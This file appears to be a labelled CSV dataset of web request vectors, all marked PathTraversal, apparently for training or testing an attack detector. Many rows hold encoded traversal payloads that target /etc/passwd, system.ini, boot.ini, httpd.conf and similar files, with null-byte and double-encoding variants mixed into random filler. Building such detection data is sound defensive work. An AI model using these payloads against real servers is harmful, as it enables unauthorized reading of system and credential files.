id,class,vector
394,PathTraversal,/tu9vjG/z4/2h/NL6x371execB/oeLZ_xU-gYHyge8FVHbu/iSRkiBtKZiph_a./xYdSJdRT3vHTfzCkABWu/eUDTt/Ss/hacTrLrn.aspx?yjAC4a=7253453&ehanashi6h=7og&tptmnb=ghMg%5Cegz+aso&neoritlA9T=802802&ueriere2clsiele=iGneuse&8n=Laop+&8a7=+ta&mRaziniEty=632&rd5=%2F..%2F..%2F..%2F..%2FInetpub%2Fiissamples%2Fet%2Flani%2Fer%2Flltastnsar.pl&8dfTiL5onh=5187128&sS8BgA0ayxuO=Oa%25u+eaorriNc0q&tg4i=11802435&tprfee1=280021&rlT=s5aiu
407,PathTraversal,/tt_m3dn9Bs/hvFP_fcAMQNK/eiiieeztrtoo9omtetn/@TDX/uxLzNgGHeCugnmVHCy7e/EAetcULJbK/aB/Twp-adminb/sAYcvGeOqaWQK/ahai9e/mmMZ9pFzptZ.gif?3frnad=r3eo&rpTQeemO=dzwr&lsjP37NGpdk=6pi&eoHxdeesamjw=nbicoeglUeNlslbSr&etmesbaCnOf=..%2F..%2F..%2Fusr%2Fdsqqdsqsd.xml&gdteivOoearXTga=2517365&rr9a4ml=s5sn8fe&rbtdoiHeleYo=7&ttrwls1xmdyhi4r=kiintxtgedwytea&aeFwtotsj=17
413,PathTraversal,/n-Xy7vwF/eBOlv-lHl3YkCbu.XXG@.png?enyhmtaHhsani=hesn4etWn4tholaeao&Stw=37807&oeeZefooRhO=4t4oroRa4dewen&Y3wrDl2OQzNT=riiiabdlm93rbi&Tdiweenitiowxet=ylsdkntwg
417,PathTraversal,/rTF-paGdCgc/rmiTseoh/o2-hK/tEeJsnFZw3K/omWRMEgW/abpIv9DBDaOaBpTkL6/tiiIleaNlathlmyUUl/aNUU_CuiwXS/winnt7cS0BSUc/ynkqD3YBN84ep5FVRcX/prXA0.swf?lHioe=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
425,PathTraversal,/d4kmK5bxL695hrY0Egki/o1rGm3./neSgdnwrfwV6aafyu/i44trNmI9UI3SP4/@a7UP358/utz@_.e71jYE57/bGn2BM/iGWGg901Gte0Z0CskcA/ebyP.sh?bhhnsid9Rssooh4=%3Dpassthru+&2WODK-aUD=rFOi&UCt3Bw0d=95&ummnebalnsas=tmeI&taLxrmaw=ho&aeiljiaehid=%2Fetc%2Fpasswd&2s=rihtaccesPosbi9nshutdown&l2eobnlx7po=hwNXF
426,PathTraversal,/sM/797XQdsdRGRJm/unaRgoyAdhh2hCa/pse/dvoopArshmka/AeueJI8ICecho/rqetgbinhAuiaoy3/aEratbwrpRPW55/9lKn9Xga.jpg?dhndE=uiabonttapoyel&7wEtue7o0tn0olr=5731950&TQtieiEwa0s=ujwgXT3f8eK&ji6bas4=rl&sqhrrlesnmuoe=6
429,PathTraversal,/sU-gncwHBPEhtaccesnl/dpy3s3euxadiin/lTEXo@cxtermqftpy/nJFUsXA1CkP4jY/stfsalomseiipsn3qtnw/td1e.cgi?zrre9sRoole=eaesa1f1EW2&vnj1i=Dt%26%25ds&sejigdedtaao=56008747&aKw9DMbgsound=en&ottkvsh0efw0lp=t%27&er4Oxe=307899&rt4edn=tiWZu6&n5dut1ter=bT%240me+nhRrtL%24%3Cne
439,PathTraversal,/sBHebj9.fPG3qJvA9Hq/e@XQkOK9a2wa/x8y/sTZQ/lR1esb4WGZYg.dll?he=dropmeg&mTye=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWINNT%5Csystem.ini&shsesIjnEejfcG=tlve1eseet7eaai&iaisufl4ffpn=lafn%29mmetat
440,PathTraversal,/6C2IsodOcp6/hIYGqLV-kRq/ehb-HZconnect/5bVi6hldtttd2adacewi.js?stteaaiuesdn=%2F.%2F..%2F..%2F..%2F.%2F..%2F..%2F.%2F..%2F..%2F.%2F..%2F..%2F..%2F
444,PathTraversal,/ek_RN72maPhmv2CyNa/ieyutr/e.7mJX9CV/te2eyeZhteneyfn.jsp?UCFJhavingM=31536713&cEopertdYttlk=iduuq&ispluwrdeo=ir0tetcitelneturaccepty8&qN9HpOIOcstdinhk=oyvw&hahsdAg8oan=tperlh&t7r5mora=%2Fetc%2Fhttpd%2Fhttpd.conf&inducohone=6733&xe3acA=i3ifpkM&anhexatcdeajt=includeeval6t%2B&uaeeno=5&PURX0=8oroo+&Ka7Qb=ldi5o
445,PathTraversal,/sSORy.Q5t5Mj.mdb?naoytosvatesr=2%3A%5Cautoexec.bat&hpmNeeE3=%27&sLbetween4laITL=o1f&AFmGs7JW=sPPDt&ibndfhtjc=37246132
455,PathTraversal,/eP/f6/pqonnectantoaQil5ciI/nbmUe/yeodsreoeaisrce/duaifjecttnOeobmeal/tdeeuhfaom4oeuhp/eoGzw/NI/to0@HTIDXF.shtml?nmnae=eu%3E%29g&AatlzSrf8ssfr6f=97720420&vsbo0O=esasd%2BeAa9etdirn1&yyutan=38298371&Lpum=7053&e7tdd=+l&otA=Nss+nlvsgeMlibaeihoe&cieatsoelaetoec=217&fagbeqaniys7t=dhs
462,PathTraversal,/wplQSUmM/oKvSyl_XPfVXm/oPv/httpWCNh0649EDGgH/i7yybTSlZ/8o/e3g0O.ALhiAd.jsp?LE-6Jlu5TmQu=ls9chig&sjawci=a5HKktp4&bo5FTSSVmO=m&EW0Au_=%2F..%2F..%2F..%2F..%2FInetpub%2Fiissamples%2Ftinatasi%2Fil%2Fntes%2Fngchli.php&rihreanetu=4682038&n6rgstu2unzedna=255137&eYfu=hnuyhN&Hbsrsda=poelp&oo4gt=8664053059&ereiet=t8g&1n4edrRrp=7s%3Bl&ptebjtl=lfa
476,PathTraversal,////?
493,PathTraversal,/ahiIhn4nl/e2TP3jaovs3UuJ/hrtorertraut4eafhxh/TB/3icebrwteelata6sE/5@TK/hesc/8MDX95Wprocessing-instructionH3.i/okJgy/s%uO9FsQlsAM.sh?S7window.open2iGEY.l=vvtt04iatsnwy1&78tthtbkOwspm=ismHF%40s7esecsz&9YqstnDc4ajno=8en&zug=eeele&TttTEclRro2soe=2vj2oeAp&sta=ymhswin&BwAO2=+vhn&uiDb02iPyyMu=includees6o&ahb2poemf=smaSn&eiesio=965868&yfumlbitgtOext=iitesn%3A%5B+ms&eshaot=950750
499,PathTraversal,/9YDaAfzRz3ZGwLls/odq.eK@jVOq6g.htm?XKdeleteH=mH6ortp8&YFnodeiafo=tin&ittmaeOr5ltufly=tePanRfo&4EsHG=rv%22bgsoundnole6cs%22e&shnAsdvhwH6=hUR2nG786&ae=hb%3FeiframeeA%2B+qhEaahes&0nstersfy=%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2Fetc%5C%2Fpasswd%2500.html&bhplronfo=oiqZ&ZjdCqzO=t%28%3E6a+eRovbscript%3Dwne%3B&rofiehRiErpco4=oedr+tmotsobjectftph+s&oAtiaeasepehoot=605
500,PathTraversal,////?
505,PathTraversal,/xLi/q_0Pe/rtee/GnrwOess/a68nrtope/bocnu/soBsg/w7u_-OOtY_ff_G5i6s/o8fEceeiksnxml/sphpzStmpl4ozmNQgW2.tiff?op1=01938&meEernpebs=%2Fetc%2Fhttpd%2Fhttpd.conf&lnrybuim=irnkosectapl&eetyg=w7ng8ita+-d
506,PathTraversal,/ac/uOM3HYNRQbQMyFan/no6e6hry/CFAdwxjnph-27jQ/entr5aswtnnht/YoDblv/dssxtieodxripe5Ht/exThidoNse9l/rs/mras05@ED.jpg?vu4rOEhuniond=z7&a8=iraRqaah&nodey2UxUaSAMNf=fhtslisjauamue&9cfbLn0o=8291&e3alk=7261&i5dh8s=Li&dK_qL=at.mGfVX_kfe
512,PathTraversal,////?
513,PathTraversal,/.nsf/../winnt/system.ini?
515,PathTraversal,/sIr/ere/2emuUg0iS/inainas.jpg?dchf=31457406&erat1=Dmwoae&eYMxLqjZ=11081866&e2eDnd=920762&Tenr=492&apod=e%3A%5C%5CWINNT%5C%5Cwin.ini&rEsoeeswraut=ihr&tjcakudZa=+group+bycmde+&hgTNes=19&aTutv8aat=igmi
522,PathTraversal,/inenIrew/ON.htm?aIsilbb6uqht=rY-UZ&gwnTtrt=dc&HhuLSnQ=Oanmw&searoyGyhw=hyotrbin&n5lgTianvwdekeh=%2F%2C%2C%2C%2FG1RMf%2Fntadnr%2Fpasswd&drfwadEicaiRzdh=85760&7elaehO31ehcSa=%24Ligdpassthrul0hmae1ht&ceYIou=+reex&L7ctieaokunx=ofM2lbuQul&mRdWqJfRA=43223
523,PathTraversal,.////////////////////////?
537,PathTraversal,/1-oK/g2r3ee/uV5h@s7-.asp?dyltsguSrdmeesD=868&oHoui=9%2Fahj&tTfRidtogn=herom%3D&nt2ohpfobd=529915&wAa=1&atmi63taqaas=6&eieumug=file%3A%2F%2F%2Fe%3A%2FohM%2Fliiu%2Fa6ldruc.xml&vU=ahiloeeuo&epMt9oar3R=3008535&9ond=RO&ftpCmLshttpn=zda&4qpyrmGhKR72o=snohgttcergd&Odoe38ybfhodph=fmrpo
539,PathTraversal,/.nsf/../winnt/system.ini?
557,PathTraversal,McZKBN6Zke7access_log=..\..\..\..\..\..\WINNT\system.ini&ae=wi
558,PathTraversal,/ih2htbaemeldlrrcl/yrF/b6tsaj3d0qees6rchSs.cfm?iWosmnc1awsa=xg4RRerml%28n3&teonuintWoT8nic=2&irvaulonrnSl=atofc&dzrToj=%2Baoioeexecwindow.opens9%3Aaih1%40&hcn=taunione&cEsf=mPx3J&gdF4RubzV=hXVbg5I%406%40T&tezlhk=.%2F..%2F.%2F..%2F&3yelettt=hmnNtsuhttpoam%3Fntvrm%5B&ghYn8=oun%3Cl
576,PathTraversal,/otxhulyghnerepseqi/o0Hu0nXal99ud_Vo-sF/x1u7VQFolkWO-xyjneuZ/lowkhg5vzeeb3/eshp1mcnaCdz.dll?yheie7=e3K3MA&@aKB-r=kTregs5s96sg&etyElB1Hlnyt=638462&dkehotnt1otmlOX=%5C.%5C.%5C%2F%5C.%5C.%5C%2Fetc%5C%2Flij.conf&jstmLesHmrsitg=rpmc5tnc&LaYxSUH=8736626
592,PathTraversal,/sac/wmgpa8_/1Jb_iXh/Ezoi6sg0iv/6hEocUOYvIIR5/rETbrlM/m@c4QtD6LEmnw3Bo3y/tvmL4t83S.pqG/TbzinsertD0Q/9i29womzeio.tiff?zh=ge+n%27d%3F&No0wze2b=..........................WINNTsystem.ini&cecnqgtm7Oswme=connectuEeh4au&rtdUg0oaru8=mI2
597,PathTraversal,/.nsf/../winnt/win.ini?
599,PathTraversal,/bAibnre/njasit5Ldo/fnswtssftcxwAi0A/aaxe1d0nrtmM7grs/qoMXdw6M3BNN/sV/fNre/3ngmbwEH@cJs1/oeEsohdWzoiehnoaTeU/uMS0p/.ehH-_VUnSphpselect/irahu.shtml?tesrSsit1xw9thA=..%2F..%2F..%2FWINDOWS%2Fautoexec.bat
613,PathTraversal,cya=\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/etc\/passwd%00.html&jphpSeX@76wW=94773676&1rohsoetaat=latne4snmrmp0tUetx&e3iasu=9304309&o2awb8t5utrxtc=afserS&vocfdllTo=hoho&et3=a4copyx
623,PathTraversal,/mdoaer9NlticmnoL/aoeapp/.GCHG563zGZlLmeta/atgNd/st9rcuk.php4?tpS6ym=..%2F..%2F..%2Fstngil%2Fadmin.txt
628,PathTraversal,/iDa_qNY/FhE4P_UY/d6dtdr9EitAauEncwnz/sth0mvjmueetA/fand%uQNinB_/7XPK4dVKgxOLr7/iIwj9Wywt1XxkDPmg/lrUcAr0heioo1o8h.js?_Zexec@g=ptThnt+
631,PathTraversal,/sh9/jRRtk/1f/ttg8eomstgz0oEtkds/rH/Tnjpaietrllvonsey.exe?ensn=e%7EexeciD9%3D7jto%2Bmd+oe&hgN1c@EUAyrm=7285723&yaeeiGthierp5s=hi&pE4O=zsI+otnod+%2F&txsu1oewsrfl=1nasethl&Ttoeuomory6jR=%252e%252e.%5C%25252f%2F%5C%25252f%2F...%5C%25252e..%252e&tMtgrdldAtrD=r6d%3Be&aaeoOy=stoerihotfrao9a
643,PathTraversal,itfneednePpO=u9esmocexnvmoa&nsdreity=253&endnwhanna=sQaKFkE&rmnnhAHlE@5vt=Mdi&hbeIeIssi8treEe=:bgsoundn6ertqi&GstyleLp=893
647,PathTraversal,/26.php3?eFzxIpsa5taB0s=nnc&lzl=tefgh++dUaenq%28ic+aT&i6e=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWINDOWS%5Csystem.ini&aeisoetso=wYh&gnIaeyottgRu=m
649,PathTraversal,/jewrgirx/j4Z.StaR8etcYwY/2e4i4qe/netgee5agpvee/Ci1JWFhBiZPqphp2/nSFxqVh/lhziEa7v.php?rAieraKessu=6o+e%29t66eo%7Eexec+%7C&wrtodi=tnrwsod8&Vomrchsmn0a=le%3Cx%25&ats=vuokh%3D&itnern7nrffsz=%7Crclogkdi&wnupttthea=h&tg67nhgctsio=mij&on9otota3h=852&knoheiideen=4emetali+d&rVeI=+wp-u&.6Kog1E=70&Eho=leS1tA4Tenh&ffnlrno9ntFKca3=tW&m9rmZbodymFbCv0=r&x5-gvarDhomes=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fyo.bat
658,PathTraversal,/nh@U2catL6h/susiCTcrdtNRpttrhhz/eCd.OaBt-rXptnCGr/oLeoeKGe/aDkBxwuWY94/XJcatiNOO/h.YT.js?i4rsteDasonc=ds&qfowrE0vE=igv&i2jeefmurI=%2F..%2F..%2F..%2F..%2FInetpub%2Fiissamples%2Flaelmerich%2Fastons%2Felol%2Fng.nsf&2ra=tAfDTnandh+T&fisusblhyznax6b=eig%3DrImoW&lhTpEOpedl=sMW
673,PathTraversal,/stweniErndcxeiyth1wh.tiff?bdX7_.EMSM=81&CRB1documentLQy=7589316&nihhiNiInu=pis8iotkyRli&hO@tnU=5228&ctszi=w%3A%5Cwindows%5Cboot.ini&iKkC=hb1eininheouSt8lw7
675,PathTraversal,/zeaDobfehr8fece/oV5GDuFd2_vFbt-vhpr3/Hhnm/1zaerio.bin?shutdowno3Plike4ZC@=aysortitehan&ZTetcdehtolj7nl=35&etorfessalregm=%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2Fetc%5C%2Fpasswd%2500.html
682,PathTraversal,/Ttdm/.-B8XZ2Uiframea5abR6/tsRpwp-k/stqYTWjqy/opnEanh/0eeswhsTtdyDo/KNbk@Z0Bobject9insertinclude/iH9eh.gif?tf=89&eedu1=pI
684,PathTraversal,/nK2o2Qw1wrhFIf1mtg/ro.msf?doboqwDrpr=734&rel=241161&grf=34105&VUw7I2psA=himtho92rnrenhEen&nsHbnegmxlsyn=882&en=o5enuif%3Fho&y6Soeteoagx=Eia&fyttbgaaynpa8=..%2F..%2F..%2F..%2F..%2F..%2FWINDOWS%2Fautoexec.bat&N67eDFQ7scriptuniont=nU.LHwqK&ms=639764&vooUo1ehyeert1e=iwp-aobjecte&6y=138&6ugen5dt=0494&pnvphomeprocessing-instructionEHsNi.=aszao0Isy3cNa
695,PathTraversal,/tjhhmd.htm?xa=tarWaxb3%40Le8&gAp.9Cjhttp6k=9&l3oErts=%2Bhcemetaei5ctoa&73yltseart=file%3A%2F%2F%2Fb%3A%2Filwu%2Ftsst%2Fija.xml&iy=lketcx%3Cs&tsnuihrMnee=hjEhsmmina&iweOelNlDoeh=bodyyrcpdfsystemof3ipassthruenode%272E
696,PathTraversal,/ntabisrrft/yv5asqn7l/edb/4J/bfevqS1v9d8@/ed/hFi9z1TMZghLzSZDC/LGF@_4Fq/oRxe8uwktiagGDPr.jsp?qnJHSxI4=eVwV9zL&wlhi=3a%25f5&0eiBt=framgo&new5a1hoaalhma=60yboot.inistdinonC&detcaiu6eesrfk=6037&hH5AUpez=Junr&ix=l1C9Ki&MXqnjVvtelnetH=%40eescriptyqrezbin&s73l=333&3j=2652&hwmunoeaDanoee4=%2F%2C%2C%2C%2Fxnfyy%2Fwsieun%2Fpasswd
705,PathTraversal,/eWoST74nyCWM8aR3N.swf?n5=6277&aeu=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&pn=dvzNWp%40v1P
715,PathTraversal,/ngi/fzcQAGSuf4qDIhJ/FSuetenysT/esnlh7heKn/KpcK/u4LEcb@df1OHxeD1rXe/Sie45Reautr/qWxservicesSRv4EX/njSn.mdb?
718,PathTraversal,iec0rrprwta=N:\winnt\boot.ini&ntaetdsaugocd=8756471&eh=mmindonclmlllw
719,PathTraversal,/nxnbaoiasT2tEaw6siat/OUDbinGR6IQG-libno/optvunionCc2R/tCE9G9/utaoi/nr7lpr47i/vNJnm_RcXI15xxXN_nVC/aexaajtIt3i.jpeg?t7in4smtrs7=14&tnecs1wr2=ltbHaenhlaytnNl&tgeeeaa=axY-&eL=OH%40le&1ooym=..%5C..%5C..%5C..%5C..%5C..%5CWINDOWS%5Csystem.ini&AFVy2GIed=3vSSO_B
730,PathTraversal,/i1MJaG1zLuG/sssYw/ebl@Tdgtoc8WeWNq9/rTbhs2/ilW5E1-AY2rvU/tubaeUbtkyCgon/u6vDip/ilFUHBcS/sgisanaibuxe1ecn/jttatoyazdo.html?tsnnitdw=o.F3641X6&hbdanoh=p%3A%5Cwindows%5Cboot.ini&t2bewiEcun=anseogsg+Emgroup+byN&nshisolbri=%5Cdeletewhm+pr&ja0tmsEawtBioeO=uaylmqqiIh&aas=swdeletei&I4Kftpm2=138870455&t1uois=930&5lgQytnhii=6704061&iNgSaa3tnsleS9e=26950078&Bik9SidUSp9=h&e3utq9fw=a%27fo&tTo=d%7Eo&lnaiar=+T
735,PathTraversal,/Daiitt4somA/k@9Y2OlU41binPC/quL--/Q_ElL6unionU/o7gEcLkjKCCImC/iesotehlvr7p3u0r/sPQW3m.swf?eel=9gSyLoenEayw1eo&iias=hadek&iiluh3=e%3A%5C%5CWINNT%5C%5Cwin.ini&ndaddmouyTes=aoae
740,PathTraversal,/5ooax0rwhrpl/f_J9J8JO6DV80xawV9i/eglaofe/hiefesHdTd8eTId/fDWIJFiRRxoa/orGpo7wD/ooHVUoT6/nszReHmNw6rW2c/lrvpet/iXlBjnsvj5j/ft23pvaUO@/gnktV.gif?nilEaelsbfntDto=deletel4Cwo%27rnEpc&XeesrhcceeioCz=3617035&BAZNform=..%2F..%2F..%2Fusr%2Fdsqqdsqsd.xml&Op89ooa=2458644675&t2sies=8pserviceslc%40HAEn&ne9netnpoyxu=0&aohhxa83Is=2iie%3Ae-xx5%5Dwe+tcpi&httpsBRz0rcpM=uvatehtAurc&nelSexobTra=mtoeshtpassf%25
751,PathTraversal,/4qsaati7yooieaffn/FOmeta.bin?dnoeZGr1=%5C.%5C.%5C%2F%5C.%5C.%5C%2Fetc%5C%2Fpasswd&esg9ssnbeaReeE5=jykSeo0Ai
752,PathTraversal,/igrlbdRaiht/0Lo/-eRLerX5p_/an85eseedghlcseccit/tbe6n8/hscu5VeTZp8W/g4bfdcFMX0C.gif?
757,PathTraversal,/nrf--L/ehtEj9UV.tiff?oEeas1pooeelto=aMeUIcujqQG1&72ks=%3F%3E&hoEdOFreoi8=%5C.%5C.%5C%2F%5C.%5C.%5C%2Fetc%5C%2Fpasswd&aahounemgrcyb=ed
761,PathTraversal,/tihlnpunrnEsieoo/en/dyrlskat/ithdate/mLZXo6c9-j5/3@k/tgoe7BTtpcC.N/wpE7cXipgtQV-J/3EzUCJLjxFKuhJGeBYl.swf?3nvc04os9Tpylsi=costtdwtn%7Ctho%40id&n3O=shtd&ihpIwpi3a=%5C.%5C.%5C%2F%5C.%5C.%5C%2Fetc%5C%2F7mmeu.conf&p7nrliy9ri=aobjecto+o&s26ed3easig=r5dlnC8e
788,PathTraversal,/etm.j/uQE2@/w2onb5Weoaintg/b@EvX/mb.htm?aswumtigjoei=iev&lj=4sc%40hsmceji&yagreseA1d=747733&nd7lEsoeinM3=.%2F..%2F.%2F..%2F&GQ3NzSdelete.7=oU_YJFRvdj&x_@R=o+log%3Aai+d%25TeU+yR&OaNe=ei+eu&ecad0t=+&asyluc9jdaeifes=eotRa&cpboree=%40his&sbhbnotjs=oselecta&rdPhoo3EhNro8=ao+t%7E
793,PathTraversal,/t1zLV2_/jo1Su9s7Vj0owRy/9MCknodeU/im6qthneLsp/zPmldxb/nETshrP5gae/UnoOFdSGlink.png?hoka3r=pouemeg+&ecihieeOoulnIt=%5CWINNT%5Csystem.ini&ryfYcmkS=e%5Deefhacwtein&enrphu=nioed%3De%3Dl%24having8E&ELexecZL=25265
799,PathTraversal,/.nsf/../winnt/system.ini?
800,PathTraversal,/auhlid6dzosltRnsP/oIl/aw/7W3r-RqHZkk@s2VrS/se4a.shtml?qEapewze4=6EUiF0NGdC&cel6=nxin+&e44atdidfnarN=e6V&eHn0s3dfot6=heneh&zbMestgaE=..%2F..%2FUBData%2FMembers%2Fmembers.grp%2500&bdS0ttd=67&e1hdEaOwum4c=1bnaiw5haron2s&deote=13&fr6nnseps=laesamoUTlita30cen
804,PathTraversal,erOZeitpi1ot=6054&uan=ncths
807,PathTraversal,ka26oaothRa=984&toIre=wyeesslgwg7u?&oyoh7ndaaf=6094&io=kmdeu&nmhnl=iethdh&me3rpt=ElSnv idr&5afbo1Uraleltr=uwfveQ4B8&nr8JQorfOReWW=%uxela<)s&Rwuu=12212
821,PathTraversal,/wp-ODK_adminIJoE.aspx?sltoursaeh=i0ansdelete&aoleviey=ctae&zi=..%2F..%2FUBData%2FMembers%2Fmembers.grp%2500&pMPaCjZxtermZ=leEuao3be&bcPi=19782225
827,PathTraversal,/pg7rnpna/LTJpJmT4sAGE/jUqqhdihs9ECehhdssi/whwLozaZwtH.LX3d2uwR/oedbbea8hyfC/truoblSSa/hZbj_w59/5boqcl/iZr2dvB/n58_BZS3Jpg6n.pl?w0ep8osfh4alt=%5C.%5C.%5C%2F%5C.%5C.%5C%2Fetc%5C%2FpelE.conf&awWB.=tt4a6trEewtse&ahit4qieeeue4c=t.Najg&roe=eetpeztatfu&tHaGGCY48fsa=cs
831,PathTraversal,/mha4QSm0LVtvlMBhY.c/h8lfhentmniTurf0Rv/eQKu9Y/XTvarEV/ecvMAuFLLu5-Ii.html?Fay0sn7=aom%3E%27c%5Bs+l&H4aa=%7E%3Bh%3E&NQ0azyCQ=homerr%40syl&n8psSyie=5885251&3e.Yo=aianiceXnttueloier&me=..%2F..%2F..%2F..%2F..%2F..%2FWINDOWS%2Fautoexec.bat&GYrenpreplaceHt6select=co8n&BGYtxKrcpn5nET=o8lbYcDBU&ah5eR1trf6yl7i=53992356&danogtbBNiefwl=m%40etbintelnet21+cselectng%24%3Cn&EpuwI3o=3uc9xlqkO&edhnm=%2Fesoemheleoo
834,PathTraversal,/KVz/deeddta4o5bnsesgce/hrtes9blqqtt/aa/tuochyaenrrdeeeTs/UeecomHqtge2iodticoh/rZEqMb81VaZFr6S7/xBU/etcWHWHZZhfBTU56Ck/watnerovossnpi/wi/7IDViWrWknetcat@9.mdb?
848,PathTraversal,cTT_M92=r&5tmochaz= id&g-D9nxD@0=/ c0emitm&aaoo=2179015&qi9nr7=529148333
851,PathTraversal,/t9DaELnu3PVnullE/ghotede/xQiuL2dJXKThVUXkS/tDlXpR/ETx2GinGFFmVUD./twla11LePiIUao/ohmeutIJeeainp/oie2eyctstb8cero/aina/1rpZkd3QcVQQkGE.mspx?vip1mnxhde=Hstj&5l3LT8=2I80pXsU7sQ%40&JiKdivpV@=643&a6Sbaniws=optDealnbEetn0&giigkt4Gora=..%2F..%2F..%2Farront%2Fadmin.txt&zMIl=966&sh3=q6fisapynteD&sbixmhanu4jwoRl=+%27E%24funion%5Bmenctprocessing-instructionstyleo+&8teeaphcNpm=9376&ydefcfsgq=6999286&ohdt2ea=tlink%7C&eipast3dhqdk=48582508&Io3n0desrr6pd=984519&Mj.httpC=gEh1l2jwe&ylDmochaAan_K_=sercximg3s
869,PathTraversal,/ncrrt/1JoErBJllAVePt/rp6k5-@R/OX/oTFj@/ihLJhtpassG/df/nP.rPIGCedNtNas52U/onssrtlrifbokztuta/mZq@@XitwtTBI/UVQmetaM19bNUEV/ooibAg_.css?hh7j=naf1brOnr&ire=%2Fetc%2Fpasswd&simd=xtermKncwtoeyne%25c&H0qdTddcA6ti=o15NqiD_NGK&zsy6saqnqoxyohk=%3Eldropgdeleten&phpB@uDGaN=02137935&nkr=isqMwpY_C&Iemidttodls=en%3Eiefh&oi=cvdaPb
876,PathTraversal,3ankeioamsad=oaE&smtrtd=%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2Fetc%5C%2Fpasswd%2500.html&4%u9SG3lWC-=m&6mHYcep=437328421&nrOia=i6a&lIat3=kt%27tst%40ZtwTihJ
904,PathTraversal,1n6L=4rlbtnrstdinnhtaccesiframerandZEehita&hdeor=593063&PNXAq-6evalL=pmorm9UxpACe&mTnO6s1p=49A1YRHm&gr9EDn=0865&oar8hpHo=147&bl23Tsasrvttl=9o&KEaNN8=lCkNO@VeIs&z6.COWirmXScB=seitKe&xro=\autoexec.bat&tegrxepieadL=78389746&nsu=bre&L9window.openbbbody=174
913,PathTraversal,/ntuQQn6b/cci1IBf19p/yEnrRypQdlHWat6/Ntpstor/l@qy/eaw79wRiWawXFtuaZU/4eXfKoB/lwqLkj/oaQLF/lVhH7nNl.rNFih/eMnrN5aMc/r2tiEttdhNdu.jpeg?areE5sfeaito=%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2Fetc%5C%2Fpasswd%2500.html&oBFUoSQ_U=ErAcntp2atgaesafx&oiti1fu=5210915&Esaestui6ott=42&hls9wlawgaehua=00&zrooon9atc=88
918,PathTraversal,/../../?
921,PathTraversal,KB3d4wzbgsoundexecYEu=file:///5:/cagri/yDdin/znn.xml
929,PathTraversal,/QimgI.jpg?N7znisv=+tscpvhb%40arlf&Bw0oatssietaiRo=ittssreccu&p0Sruo9t86=%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2Fetc%5C%2Fpasswd%2500.html&Bp=ocst3+sunqh
931,PathTraversal,/9YsHeq1@C7PE/k7iLGa3OYkvar/efexnvhtare/er/a_5adkV@hban/ss1yaTk/MMRaHHFP2WrV.exe?UFN.=77&esezuTatah=0463&yo0esy2=file%3A%2F%2F%2Fa%3A%2Fsf3X%2Ftee7%2Ffyirc.xml&ooTt=%28OiaoeE+hhs+nauhac
932,PathTraversal,naa3phratrItrnh=12366&osthE=|opfcn@&gnatamnE=643928618&wkx=iayl4ishcicqo&idi12ihAated=085904&mtuWlqhrtaTiO5=560678069&qxfnt=Disbt&QNxgiesX=ejp&sgbr=\WINNT\system.ini&hheNfbPm=23268168
949,PathTraversal,/_upftpkK@zD6i417D/lCbuEvd8MW9veDSFqq/Jtbin/ebcbtrotAa9nwc/iNiZ.ygKTQrTOs95g/extH3M9bf37p./Rlress8e/keO/an4R_vzT80af/0wh.html?0rldsnInRere=ttselectucra%2BraottUs&taisi9pu=cznt2utl
